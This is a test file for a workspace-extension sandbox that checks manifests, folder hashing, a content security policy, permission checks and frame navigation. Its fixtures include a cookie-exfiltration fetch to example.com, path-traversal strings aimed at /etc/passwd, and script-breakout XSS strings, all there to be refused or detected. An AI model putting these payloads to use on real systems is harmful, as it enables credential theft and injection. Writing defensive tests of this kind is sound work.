// Workspace extensions, the rules (GitHub 507, 524): the manifest, the
// folder and its hash, the document a frame is served, what a document
// may ask for and hear, and the page's half held to the server's.
// The routes, as a website, a phone, a member and an agent meet them,
// are in test/extensions-routes.test.ts.
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, test } from "node:test";

import {
  EVENTS,
  EXTENSION_CSP,
  EXTENSION_LIMITS,
  FRAME_HEADERS,
  FRAME_PRELUDE,
  FolderRefused,
  MANIFEST_FILE,
  PAGE_METHODS,
  PERMISSION_IDS,
  SERVER_METHODS,
  agentsForExtension,
  checkManifest,
  entryFor,
  extensionMessage,
  frameExtensionDocument,
  hearsEvent,
  inlineAssets,
  insidePath,
  manifestIn,
  mayCall,
  messageRoom,
  patchSettings,
  readInstalled,
  satisfiesRange,
  settingsOf,
  snapshotFolder,
  storageChange,
  writeInstalled,
  type ExtensionManifest,
} from "../server/extensions.ts";
import { methodTable } from "../server/extension-routes.ts";
import { themeFrom } from "../server/mcp-apps.ts";
import {
  CommandWindows,
  COMMAND_WINDOW_MS,
  EVENTS as PAGE_EVENTS,
  METHODS,
  PAGE_METHODS as PAGE_SIDE,
  agentsFor,
  callVerdict,
  eventFromFrame,
  hears,
  leftItsDocument,
  parseFrameMessage,
  type ExtensionInfo,
} from "../src/lib/extensions.ts";
import { leavesExtensionFrame } from "../electron/navigation.mjs";

const files = (...names: string[]) => new Set(names);
const good = {
  manifestVersion: 1,
  id: "team-status",
  name: "Team status",
  version: "1.0.0",
  description: "Who is working.",
  bloks: ">=3.0.0",
  permissions: ["agents:read", "turns:read", "storage"],
  panels: [{ id: "status", title: "Team status", entry: "panel.html" }],
  background: "background.html",
  commands: [{ id: "ask", title: "Ask for a status update" }],
  events: ["turn.started", "turn.finished", "agents.changed"],
  settings: [{ key: "showIdle", label: "Show idle agents", type: "boolean", default: true }],
};

describe("the manifest", () => {
  test("a good one is read whole", () => {
    const verdict = checkManifest(good, files("panel.html", "background.html", MANIFEST_FILE), "3.2.8");
    assert.deepEqual(verdict.problems, []);
    assert.equal(verdict.manifest?.id, "team-status");
    assert.deepEqual(verdict.manifest?.permissions, ["agents:read", "turns:read", "storage"]);
    assert.deepEqual(verdict.manifest?.panels, [{ id: "status", title: "Team status", entry: "panel.html" }]);
    assert.equal(verdict.manifest?.background, "background.html");
  });

  test("every problem is said at once, and none is installed", () => {
    const verdict = checkManifest(
      {
        ...good,
        id: "Team Status!",
        version: "one",
        bloks: ">=9.0.0",
        permissions: ["agents:read", "secrets:read", "network"],
        panels: [{ id: "status", title: "Status", entry: "../outside.html" }, { id: "x", title: "X", entry: "missing.html" }],
        events: ["turn.started", "message.created", "agents.changed"],
      },
      files("panel.html"),
      "3.2.8",
    );
    assert.equal(verdict.manifest, null);
    const said = verdict.problems.join("\n");
    assert.match(said, /id must be/);
    assert.match(said, /version must look like/);
    assert.match(said, /needs Bloks >=9\.0\.0, and this is Bloks 3\.2\.8/);
    assert.match(said, /"secrets:read" is not a permission Bloks has/);
    assert.match(said, /"network" is not a permission Bloks has/);
    assert.match(said, /panels\[0\]\.entry must be a path inside the folder/);
    assert.match(said, /missing\.html, is not in the folder/);
    assert.match(said, /"message\.created" is not an event Bloks sends/);
    assert.match(said, /The event turn\.started needs the permission turns:read/);
  });

  test("a name cannot hide what it is behind control or reordering characters", () => {
    const verdict = checkManifest({ ...good, name: "Team\u202e status\u200b" }, files("panel.html", "background.html"), "3.2.8");
    assert.equal(verdict.manifest?.name, "Team status");
  });

  test("something has to hear its commands and events, and it has to add something", () => {
    const deaf = checkManifest({ ...good, panels: [], background: undefined }, files(), "3.2.8");
    assert.match(deaf.problems.join("\n"), /Commands and events need a background document or a panel/);
    const empty = checkManifest({ ...good, panels: [], background: undefined, commands: [], events: [], permissions: [] }, files(), "3.2.8");
    assert.match(empty.problems.join("\n"), /It adds nothing/);
  });

  test("a version range is the few forms people write, and nothing else", () => {
    assert.equal(satisfiesRange("3.3.0", ">=3.3.0"), true);
    assert.equal(satisfiesRange("3.2.8", ">=3.3.0"), false);
    assert.equal(satisfiesRange("3.9.1", "^3.3.0"), true);
    assert.equal(satisfiesRange("4.0.0", "^3.3.0"), false);
    assert.equal(satisfiesRange("3.3.7", "~3.3.0"), true);
    assert.equal(satisfiesRange("3.4.0", "~3.3.0"), false);
    assert.equal(satisfiesRange("3.5.0", ">=3.3.0 <4"), true);
    assert.equal(satisfiesRange("4.1.0", ">=3.3.0 <4"), false);
    assert.equal(satisfiesRange("3.3.0", "*"), true);
    assert.equal(satisfiesRange("3.3.0", "latest"), null);
    assert.equal(satisfiesRange("3.3.0", ">=3.3.0 || <2"), null);
  });

  test("a path inside the folder never climbs out, is never absolute, hidden or a scheme", () => {
    assert.equal(insidePath("panel.html"), "panel.html");
    assert.equal(insidePath("./ui/panel.html"), "ui/panel.html");
    for (const bad of ["../x.html", "ui/../../x", "/etc/passwd", "C:\\x", "ui\\x.html", ".env", "ui/.git/config", "file:///etc/passwd", "https://example.com/x.js", "//example.com/x.js", "a\0b", "", "ui//x"]) {
      assert.equal(insidePath(bad), null, bad);
    }
  });

  test("settings take only values of their type, and only keys the manifest has", () => {
    const m = checkManifest(good, files("panel.html", "background.html"), "3.2.8").manifest!;
    assert.deepEqual(settingsOf({ manifest: m, settings: {} }), { showIdle: true });
    assert.deepEqual(patchSettings(m, {}, { showIdle: false }), { ok: true, settings: { showIdle: false } });
    assert.equal(patchSettings(m, {}, { showIdle: "no" }).ok, false);
    assert.equal(patchSettings(m, {}, { apiKey: "sk-123" }).ok, false);
  });
});

describe("the folder", () => {
  const folder = (t: { after: (fn: () => void) => void }) => {
    const dir = mkdtempSync(join(tmpdir(), "bloks-ext-"));
    t.after(() => rmSync(dir, { recursive: true, force: true }));
    writeFileSync(join(dir, MANIFEST_FILE), JSON.stringify(good));
    writeFileSync(join(dir, "panel.html"), "<p>panel</p>");
    writeFileSync(join(dir, "background.html"), "<script src=\"bg.js\"></script>");
    writeFileSync(join(dir, "bg.js"), "bloks.on('turn.started', () => {})");
    return dir;
  };

  test("is read once, hidden files left out, and hashed", (t) => {
    const dir = folder(t);
    mkdirSync(join(dir, ".git"));
    writeFileSync(join(dir, ".git", "config"), "token=ghp_x");
    writeFileSync(join(dir, ".env"), "SECRET=1");
    const snap = snapshotFolder(dir);
    assert.deepEqual(snap.files.map((f) => f.path).sort(), ["background.html", "bg.js", MANIFEST_FILE, "panel.html"].sort());
    assert.match(snap.digest, /^[0-9a-f]{64}$/);
    assert.equal(manifestIn(snap, "3.2.8").manifest?.id, "team-status");
    writeFileSync(join(dir, "panel.html"), "<p>changed</p>");
    assert.notEqual(snapshotFolder(dir).digest, snap.digest, "a changed file is a different hash");
  });

  test("a link anywhere in it refuses the whole folder", (t) => {
    const dir = folder(t);
    symlinkSync("/etc/hosts", join(dir, "hosts.html"));
    assert.throws(() => snapshotFolder(dir), (e: Error) => e instanceof FolderRefused && /is a link/.test(e.message));
  });

  test("a folder too large is refused before it is all read", (t) => {
    const dir = folder(t);
    writeFileSync(join(dir, "big.bin"), Buffer.alloc(EXTENSION_LIMITS.fileBytes + 1));
    assert.throws(() => snapshotFolder(dir), /larger than 2 MB/);
  });

  test("what is installed is the bytes that were hashed, and a change after is caught", (t) => {
    const dir = folder(t);
    const root = mkdtempSync(join(tmpdir(), "bloks-ext-root-"));
    t.after(() => rmSync(root, { recursive: true, force: true }));
    const snap = snapshotFolder(dir);
    // the folder changes after the look: what lands is what was looked at
    writeFileSync(join(dir, "panel.html"), "<p>swapped</p>");
    writeInstalled(root, "team-status", snap);
    const back = readInstalled(root, { id: "team-status", digest: snap.digest });
    assert.ok(back);
    assert.equal(back.files.find((f) => f.path === "panel.html")?.bytes.toString(), "<p>panel</p>");
    // somebody writes into the installed copy: it is no longer served
    writeFileSync(join(root, "team-status", "bg.js"), "fetch('https://example.com/?' + document.cookie)");
    assert.equal(readInstalled(root, { id: "team-status", digest: snap.digest }), null);
    assert.equal(readInstalled(root, { id: "../team-status", digest: snap.digest }), null);
  });
});

describe("the framed document", () => {
  const theme = themeFrom({ scheme: "dark" });

  test("its policy is a sandbox with no network, no eval, framed only by the app", () => {
    for (const part of ["sandbox allow-scripts", "default-src 'none'", "connect-src 'none'", "form-action 'none'", "frame-src 'none'", "worker-src 'none'", "object-src 'none'", "base-uri 'none'", "frame-ancestors 'self'"]) {
      assert.ok(EXTENSION_CSP.includes(part), part);
    }
    assert.doesNotMatch(EXTENSION_CSP, /unsafe-eval|https?:|\*/);
    assert.doesNotMatch(EXTENSION_CSP, /allow-same-origin|allow-top-navigation|allow-popups|allow-forms/);
    assert.equal(FRAME_HEADERS["content-security-policy"], EXTENSION_CSP);
    assert.equal(FRAME_HEADERS["cache-control"], "no-store");
  });

  test("its own files are folded in, and nothing outside it", () => {
    const own = new Map([
      ["app.js", Buffer.from("window.ok = 1; '</script><script>alert(1)</script>'")],
      ["ui/style.css", Buffer.from("body{color:red}</style><script>alert(2)</script>")],
      ["logo.png", Buffer.from([0x89, 0x50, 0x4e, 0x47])],
    ]);
    const read = (p: string) => own.get(p) ?? null;
    const html = inlineAssets(
      [
        '<script src="app.js"></script>',
        '<script src="../../etc/passwd"></script>',
        '<script src="https://cdn.example.com/x.js"></script>',
        '<link rel="stylesheet" href="ui/style.css">',
        '<img src="logo.png" alt="">',
        '<img src="/Users/someone/private.png">',
      ].join("\n"),
      read,
    );
    assert.match(html, /<script>window\.ok = 1; '<\\\/script><script>alert\(1\)<\\\/script>'<\/script>/);
    assert.match(html, /<script src="\.\.\/\.\.\/etc\/passwd"><\/script>/, "a path out of the folder is left to fail");
    assert.match(html, /<script src="https:\/\/cdn\.example\.com\/x\.js"><\/script>/, "the policy refuses it, nothing here fetches it");
    assert.match(html, /<style>body\{color:red\}<\\\/style><script>alert\(2\)<\/script><\/style>/);
    assert.match(html, /src="data:image\/png;base64,iVBORw=="/);
    assert.match(html, /src="\/Users\/someone\/private\.png"/);
  });

  test("the SDK comes before the extension's markup, and takes WebRTC away", () => {
    const doc = frameExtensionDocument("<h1>Mine</h1>", () => null, theme);
    assert.ok(doc.indexOf("Content-Security-Policy") < doc.indexOf("<h1>Mine</h1>"));
    assert.ok(doc.indexOf(FRAME_PRELUDE) < doc.indexOf("<h1>Mine</h1>"));
    assert.match(FRAME_PRELUDE, /RTCPeerConnection/);
    assert.match(FRAME_PRELUDE, /e\.source!==host/, "only the page that framed it is listened to");
    // the colours, under Bloks's names and the plain ones other hosts use
    assert.match(doc, /--bloks-bg:#17171a/);
    assert.match(doc, /--background:#17171a/);
    assert.match(doc, /--brand:/);
  });

  test("a colour handed in cannot close the stylesheet", () => {
    const doc = frameExtensionDocument("", () => null, themeFrom({ scheme: "dark", background: "red}</style><script>alert(1)</script>" }));
    assert.doesNotMatch(doc, /alert\(1\)/);
  });

  test("a document is a panel by id or the background, and nothing else", () => {
    const m = checkManifest(good, files("panel.html", "background.html"), "3.2.8").manifest!;
    assert.equal(entryFor(m, "status"), "panel.html");
    assert.equal(entryFor(m, "background"), "background.html");
    assert.equal(entryFor(m, "bloks-extension"), null);
    assert.equal(entryFor({ ...m, background: undefined } as ExtensionManifest, "background"), null);
  });
});

describe("what a document may ask for and hear", () => {
  test("a call needs its permission, and only known calls exist", () => {
    assert.deepEqual(mayCall(["agents:read"], "agents.list"), { ok: true });
    assert.equal(mayCall([], "agents.list").ok, false);
    assert.equal(mayCall(["agents:read"], "agents.message").ok, false);
    assert.deepEqual(mayCall([], "settings.get"), { ok: true });
    for (const reach of ["secrets.list", "config.get", "connections.list", "fetch", "agents.token", "__proto__", "constructor", "toString"]) {
      assert.equal(mayCall([...PERMISSION_IDS], reach).ok, false, reach);
    }
  });

  test("an event is heard only when asked for and granted", () => {
    const m = checkManifest(good, files("panel.html", "background.html"), "3.2.8").manifest!;
    assert.equal(hearsEvent({ manifest: m, granted: ["agents:read", "turns:read", "storage"] }, "turn.started"), true);
    assert.equal(hearsEvent({ manifest: m, granted: ["agents:read", "storage"] }, "turn.started"), false);
    assert.equal(hearsEvent({ manifest: m, granted: [...PERMISSION_IDS] }, "selection.changed"), false, "not asked for");
    assert.equal(hearsEvent({ manifest: m, granted: [] }, "theme.changed"), true);
    assert.equal(hearsEvent({ manifest: m, granted: [...PERMISSION_IDS] }, "message.created"), false);
  });

  test("the page's table of calls and events is the server's", () => {
    assert.deepEqual(METHODS, methodTable());
    assert.deepEqual(new Set(PAGE_SIDE), new Set(Object.keys(PAGE_METHODS)));
    assert.deepEqual(PAGE_EVENTS, EVENTS);
    for (const key of Object.keys(SERVER_METHODS)) assert.ok(!PAGE_SIDE.has(key), key);
  });

  test("an agent as an extension sees it is a name and whether it works, the owner's own only", () => {
    const seen = agentsForExtension([
      { id: "a1", name: "Ada", tasks: [{ busy: true }], ...({ instructions: "secret plan", env: { OPENAI_API_KEY: "sk-live" }, token: "bt_x" } as object) },
      { id: "a2", name: "Mo", hidden: true },
      { id: "a3", name: "Old", archivedAt: 1 },
      { id: "a4", name: "Member's own", solo: { by: "person-1" } },
      { id: "a5", name: "Owner's solo", solo: { by: "owner" } },
    ]);
    assert.deepEqual(seen, [
      { id: "a1", name: "Ada", working: true },
      { id: "a5", name: "Owner's solo", working: false },
    ]);
    assert.doesNotMatch(JSON.stringify(seen), /secret|sk-live|bt_x|token|env/);
  });

  test("its storage is bounded and its messages to agents counted by the hour", () => {
    const big = "x".repeat(EXTENSION_LIMITS.storageBytes);
    assert.equal(storageChange({}, "storage.set", { key: "k", value: big }).ok, false);
    assert.equal(storageChange({}, "storage.set", { key: "", value: 1 }).ok, false);
    assert.deepEqual(storageChange({ a: 1 }, "storage.remove", { key: "a" }), { ok: true, next: {} });
    let sent: number[] = [];
    const now = 1_000_000_000;
    for (let i = 0; i < EXTENSION_LIMITS.messagesPerHour; i++) {
      const room = messageRoom(sent, now + i);
      assert.ok(room.ok);
      sent = room.kept;
    }
    assert.equal(messageRoom(sent, now + 100).ok, false);
    assert.equal(messageRoom(sent, now + 60 * 60_000 + 100).ok, true, "an hour later there is room again");
    assert.match(extensionMessage("Team status", "Give me a status update"), /These are the extension's words, not the owner's/);
  });
});

describe("the page's half", () => {
  const ext = (over: Partial<ExtensionInfo> = {}): ExtensionInfo => ({
    id: "team-status",
    name: "Team status",
    version: "1.0.0",
    description: "",
    bloks: ">=3.0.0",
    enabled: true,
    permissions: [{ id: "agents:read", words: "", high: false }],
    panels: [],
    background: true,
    commands: [],
    events: ["agents.changed"],
    settings: [],
    values: {},
    source: { kind: "folder", path: "/x", name: "x" },
    installedAt: 0,
    updatedAt: 0,
    intact: true,
    ...over,
  });

  test("a frame's message is one of three shapes, or nothing", () => {
    assert.deepEqual(parseFrameMessage({ bloks: 1, type: "ready" }), { type: "ready" });
    assert.deepEqual(parseFrameMessage({ bloks: 1, type: "call", id: 3, method: "agents.list", params: null }), { type: "call", id: 3, method: "agents.list", params: null });
    assert.equal(parseFrameMessage({ type: "call", id: 3, method: "agents.list" }), null, "not marked as ours");
    assert.equal(parseFrameMessage({ bloks: 1, type: "call", id: -1, method: "x" }), null);
    assert.equal(parseFrameMessage({ bloks: 1, type: "call", id: 1, method: "x".repeat(61) }), null);
    assert.equal(parseFrameMessage({ bloks: 1, type: "call", id: 1, method: "storage.set", params: { value: "x".repeat(70_000) } }), null);
    assert.equal(parseFrameMessage({ bloks: 1, type: "fetch", url: "https://example.com" }), null);
    const cyclic: Record<string, unknown> = {};
    cyclic.self = cyclic;
    assert.equal(parseFrameMessage({ bloks: 1, type: "call", id: 1, method: "storage.set", params: cyclic }), null);
  });

  test("a call is checked against the grant before anything answers it", () => {
    assert.equal(callVerdict(ext(), "agents.selected"), null);
    assert.match(callVerdict(ext(), "composer.insert") ?? "", /composer:write/);
    assert.match(callVerdict(ext({ enabled: false }), "agents.list") ?? "", /switched off/);
    assert.match(callVerdict(ext(), "secrets.list") ?? "", /not something an extension can ask for/);
    assert.equal(hears(ext(), "agents.changed"), true);
    assert.equal(hears(ext(), "turn.started"), false);
    assert.equal(hears(ext({ events: ["turn.started"] }), "turn.started"), false, "asked for, not granted");
  });

  test("a turn is told by agent and conversation, never by what was said, and only for the owner's agents", () => {
    const bots = [
      { id: "a1", name: "Ada", threadId: "t1", tasks: [{ id: "t1", state: "working" }, { id: "t2", state: "idle" }] },
      { id: "m1", name: "Member's", threadId: "t9", solo: { by: "person-1" }, tasks: [{ id: "t9", state: "idle" }] },
    ] as never[];
    assert.deepEqual(eventFromFrame({ kind: "runtime", event: { type: "turn.started", threadId: "t2", text: "secret" } }, bots), {
      name: "turn.started",
      data: { agentId: "a1", conversationId: "t2" },
    });
    assert.deepEqual(eventFromFrame({ kind: "runtime", event: { type: "turn.completed", threadId: "t1" } }, bots)?.name, "turn.finished");
    assert.equal(eventFromFrame({ kind: "runtime", event: { type: "turn.started", threadId: "t9" } }, bots), null);
    assert.equal(eventFromFrame({ kind: "runtime", event: { type: "content.delta", threadId: "t1" } }, bots), null);
    assert.equal(eventFromFrame({ kind: "message", threadId: "t1" }, bots), null);
    assert.deepEqual(agentsFor(bots), [{ id: "a1", name: "Ada", working: true }]);
  });

  test("an extension messages an agent only right after a command, once per run", () => {
    const windows = new CommandWindows();
    assert.equal(windows.take("x", 1000), false, "never on its own");
    windows.ran("x", 1000);
    assert.equal(windows.take("y", 1001), false, "not another extension's command");
    assert.equal(windows.take("x", 1000 + COMMAND_WINDOW_MS + 1), false, "not long after");
    windows.ran("x", 5000);
    assert.equal(windows.take("x", 5001), true);
    assert.equal(windows.take("x", 5002), false, "one message for one run");
  });

  test("a frame that loads a second time has left its document", () => {
    assert.equal(leftItsDocument(1), false);
    assert.equal(leftItsDocument(2), true);
  });

  test("the desktop app keeps an extension's frame on its own document", () => {
    const own = "http://127.0.0.1:8799/api/extensions/team-status/frame/status?theme=%7B%7D";
    assert.equal(leavesExtensionFrame(own, own), false, "its own reload");
    assert.equal(leavesExtensionFrame(own, "http://127.0.0.1:8799/api/extensions/team-status/frame/status?theme=x"), false);
    assert.equal(leavesExtensionFrame(own, "https://example.com/?stolen=1"), true);
    assert.equal(leavesExtensionFrame(own, "http://127.0.0.1:8799/api/secrets"), true);
    assert.equal(leavesExtensionFrame(own, "http://127.0.0.1:8799/api/extensions/other/frame/status"), true);
    assert.equal(leavesExtensionFrame(own, "data:text/html,x"), true);
    assert.equal(leavesExtensionFrame(own, "not a url"), true);
    // frames that are not an extension's are not this rule's business
    assert.equal(leavesExtensionFrame("about:srcdoc", "https://example.com"), false);
    assert.equal(leavesExtensionFrame("", "http://127.0.0.1:8799/api/extensions/team-status/frame/status"), false);
  });
});
